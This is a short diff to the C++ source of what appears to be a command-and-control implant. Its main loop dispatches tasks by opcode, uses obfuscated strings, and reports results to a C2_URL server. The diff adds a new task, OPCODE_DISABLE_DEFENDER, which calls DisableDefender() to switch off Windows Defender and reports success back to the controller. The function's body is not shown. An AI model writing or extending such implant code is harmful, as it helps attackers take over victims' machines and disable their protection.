@@ -265,5 +265,10 @@ int main()
 			std::string result = Whoami();
 			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
+		else if (opcode == OPCODE_DISABLE_DEFENDER)
+		{
+			BOOL result = DisableDefender();
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", result != FALSE, currentProfile);
+		}
 	}
 }
